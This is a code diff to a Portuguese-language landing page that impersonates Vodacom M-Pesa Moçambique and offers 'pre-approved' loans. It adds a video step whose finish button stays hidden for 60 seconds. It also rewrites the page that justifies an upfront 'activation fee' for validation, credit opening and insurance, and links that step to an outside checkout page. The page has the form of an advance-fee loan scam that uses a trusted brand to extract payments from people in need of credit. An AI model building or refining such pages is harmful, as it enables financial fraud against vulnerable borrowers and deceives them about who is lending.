@@ -262,7 +262,7 @@
                 </button>
             </div>
 
-            <!-- STEP 8: VSL (Video Sales Letter) Page with VTurb -->
+            <!-- STEP 8: VSL (Video Sales Letter) Page with VTurb & Delayed Button -->
             <div id="step-8" class="step-content hidden p-6">
                 <h2 class="text-xl font-bold text-gray-900 mb-2 text-center">Assista ao vídeo para liberar o seu Empréstimos M-Pesa</h2>
                 <p class="text-xs text-gray-600 mb-4 text-center">Veja o vídeo abaixo até ao fim para receber a solicitação de empréstimo diretamente no seu M-Pesa.</p>
@@ -273,11 +273,14 @@
                     <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/2032284b-8ea9-43ac-b7c5-3d37319d8075/players/6ad119cca2a8ffe04faeef29/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
                 </div>
 
-                <!-- Botão Finalizar Empréstimo -->
-                <div class="mb-5">
-                    <button type="button" id="btn-finalizar" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-base cursor-pointer">
+                <!-- Botão Finalizar Empréstimo (Aparece após 1 minuto) -->
+                <div id="delayed-button-container" class="mb-5 hidden">
+                    <button type="button" id="btn-finalizar" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-base cursor-pointer animate-bounce">
                         Finalizar Empréstimo
                     </button>
+                </div>
+                <div id="timer-message" class="mb-5 text-center text-xs text-gray-500 bg-gray-100 p-3 rounded-xl">
+                    ⏳ O botão de finalização aparecerá após assistir às instruções (<span id="countdown">60</span>s)
                 </div>
 
                 <!-- Sound Alert Box -->
@@ -483,60 +486,78 @@
 
             </div>
 
-            <!-- STEP 9: Pedido Pré-aprovado & Taxa de Ativação -->
-            <div id="step-9" class="step-content hidden p-6">
-                <div class="text-center mb-5">
-                    <span class="bg-green-100 text-mpesagreen text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider">Pedido pré-aprovado</span>
+            <!-- STEP 9: Pedido Pré-aprovado & Taxa de Ativação (Redesenhado de forma muito agradável) -->
+            <div id="step-9" class="step-content hidden p-6 space-y-5">
+                
+                <!-- Badge de Sucesso -->
+                <div class="text-center">
+                    <div class="inline-flex items-center justify-center w-12 h-12 bg-emerald-100 text-mpesagreen rounded-full mb-2 shadow-sm">
+                        ✓
+                    </div>
+                    <span class="bg-emerald-50 text-mpesagreen text-[11px] font-bold px-3 py-1 rounded-full uppercase tracking-wider border border-emerald-200">Pedido pré-aprovado com sucesso</span>
                     <h2 class="text-xl font-extrabold text-gray-900 mt-2">Falta apenas um passo para receber o seu dinheiro</h2>
                     <p class="text-xs text-gray-600 mt-1 leading-relaxed">
-                        Os seus dados foram analisados e o seu empréstimo está reservado. Antes da aprovação final existe uma taxa única de ativação.
+                        Os seus dados foram validados e o seu empréstimo está reservado em segurança no sistema M-Pesa.
                     </p>
                 </div>
 
-                <!-- Info Box -->
-                <div class="bg-red-50 border border-red-100 rounded-xl p-4 mb-5 text-xs text-gray-700 space-y-3">
-                    <h3 class="font-bold text-vodared text-sm">Porque é que a taxa é paga antes?</h3>
-                    <p class="leading-relaxed">
-                        Sabemos que quem pede um empréstimo precisa de dinheiro — por isso a taxa é propositadamente baixa e única. Ela não é o pagamento do empréstimo: é o custo de abrir e proteger o crédito, e é o que nos permite emprestar sem exigir garantias, fiador, banco ou bens em seu nome.
+                <!-- Cartão Principal de Explication -->
+                <div class="bg-gradient-to-br from-red-50 to-white border border-red-200 rounded-2xl p-5 shadow-sm space-y-3">
+                    <h3 class="font-bold text-vodared text-sm flex items-center gap-1.5">
+                        <span>💡</span> Porque é que a taxa é cobrada antes?
+                    </h3>
+                    <p class="text-xs text-gray-700 leading-relaxed">
+                        Sabemos que quem precisa de crédito não pode esperar. Por isso, a nossa taxa de ativação é <strong>única, acessível e não recorrente</strong>. Ela garante o registo oficial do contrato, a abertura da linha de crédito e a proteção do seguro — tudo <strong>sem exigir fiador, bancos ou bens em seu nome</strong>.
                     </p>
-                    
-                    <div class="space-y-2 pt-2 border-t border-red-200">
+                </div>
+
+                <!-- Lista de Benefícios Claros -->
+                <div class="space-y-2.5 text-xs">
+                    <div class="flex items-start space-x-3 bg-gray-50 p-3 rounded-xl border border-gray-100">
+                        <span class="text-mpesagreen font-bold text-base leading-none">✔</span>
                         <div>
-                            <strong class="text-gray-900 block">✔ Validação do seu processo</strong>
-                            <p class="text-gray-600">A taxa cobre a verificação de identidade, análise de risco e o registo oficial do contrato no sistema de crédito.</p>
+                            <strong class="text-gray-900 block">Validação de Identidade e Risco</strong>
+                            <span class="text-gray-500 text-[11px]">Garante a conformidade legal e o envio direto para o seu número.</span>
                         </div>
+                    </div>
+                    <div class="flex items-start space-x-3 bg-gray-50 p-3 rounded-xl border border-gray-100">
+                        <span class="text-mpesagreen font-bold text-base leading-none">✔</span>
                         <div>
-                            <strong class="text-gray-900 block">✔ Abertura do crédito no M-Pesa</strong>
-                            <p class="text-gray-600">É o custo administrativo para abrir a linha de crédito e ligar o valor aprovado à sua conta M-Pesa.</p>
+                            <strong class="text-gray-900 block">Abertura de Crédito M-Pesa</strong>
+                            <span class="text-gray-500 text-[11px]">Vinculação imediata do montante aprovado à sua conta móvel.</span>
                         </div>
+                    </div>
+                    <div class="flex items-start space-x-3 bg-gray-50 p-3 rounded-xl border border-gray-100">
+                        <span class="text-mpesagreen font-bold text-base leading-none">✔</span>
                         <div>
-                            <strong class="text-gray-900 block">✔ Seguro de proteção do empréstimo</strong>
-                            <p class="text-gray-600">Garante que, em caso de imprevisto, o seu crédito fica protegido e o seu nome não é penalizado.</p>
+                            <strong class="text-gray-900 block">Seguro de Proteção de Empréstimo</strong>
+                            <span class="text-gray-500 text-[11px]">Tranquilidade total caso ocorra qualquer imprevisto financeiro.</span>
                         </div>
                     </div>
                 </div>
 
-                <!-- Highlights Cards -->
-                <div class="grid grid-cols-3 gap-2 text-center mb-5 text-[11px]">
+                <!-- Destaques em Grid -->
+                <div class="grid grid-cols-3 gap-2 text-center text-[11px]">
                     <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
-                        <span class="font-bold text-gray-900 block">Sem descontos surpresa</span>
-                        <span class="text-gray-500">Valor integral na conta</span>
+                        <span class="font-bold text-gray-900 block">Sem descontos</span>
+                        <span class="text-gray-500">Valor integral</span>
                     </div>
                     <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
                         <span class="font-bold text-gray-900 block">Taxa única</span>
-                        <span class="text-gray-500">Não recorrente</span>
+                        <span class="text-gray-500">Sem surpresas</span>
                     </div>
                     <div class="bg-gray-50 p-2.5 rounded-xl border border-gray-200">
                         <span class="font-bold text-gray-900 block">100% M-Pesa</span>
-                        <span class="text-gray-500">No seu número</span>
+                        <span class="text-gray-500">No seu telemóvel</span>
                     </div>
                 </div>
 
-                <button type="button" onclick="alert('Redirecionando para o portal de pagamento seguro M-Pesa...')" class="w-full bg-mpesagreen hover:bg-emerald-700 text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-sm cursor-pointer mb-3">
+                <!-- Botão de Checkout com Link Direto -->
+                <a href="https://payment-hub-hero.lovable.app/checkout/2aaacff6-35d0-420c-8347-beb5b658d3ef" target="_blank" class="block w-full text-center bg-mpesagreen hover:bg-emerald-700 text-white font-bold py-4 px-6 rounded-xl shadow-lg transition duration-200 text-sm cursor-pointer">
                     Entendi, continuar para pagamento
-                </button>
+                </a>
 
-                <p class="text-[10px] text-gray-400 text-center">Processo seguro e encriptado · Vodacom M-Pesa Moçambique</p>
+                <p class="text-[10px] text-gray-400 text-center pb-2">Processo seguro e encriptado · Vodacom M-Pesa Moçambique</p>
             </div>
 
         </div>
@@ -552,6 +573,7 @@
         let currentStep = 0;
         const totalSteps = 7;
         const formData = {};
+        let timerInterval = null;
 
         function updateView() {
             for (let i = 0; i <= 9; i++) {
@@ -571,6 +593,35 @@
                 document.getElementById('step-counter').innerText = `Etapa ${currentStep} de ${totalSteps}`;
                 document.getElementById('progress-bar').style.width = `${percent}%`;
             }
+
+            // Ativar temporizador de 1 minuto na VSL (Passo 8)
+            if (currentStep === 8) {
+                startDelayedButtonTimer();
+            }
+        }
+
+        function startDelayedButtonTimer() {
+            const btnContainer = document.getElementById('delayed-button-container');
+            const timerMsg = document.getElementById('timer-message');
+            const countdownEl = document.getElementById('countdown');
+            
+            btnContainer.classList.add('hidden');
+            timerMsg.classList.remove('hidden');
+            
+            let timeLeft = 60;
+            countdownEl.innerText = timeLeft;
+
+            if (timerInterval) clearInterval(timerInterval);
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                countdownEl.innerText = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerMsg.classList.add('hidden');
+                    btnContainer.classList.remove('hidden');
+                }
+            }, 1000);
         }
 
         function nextStep() {
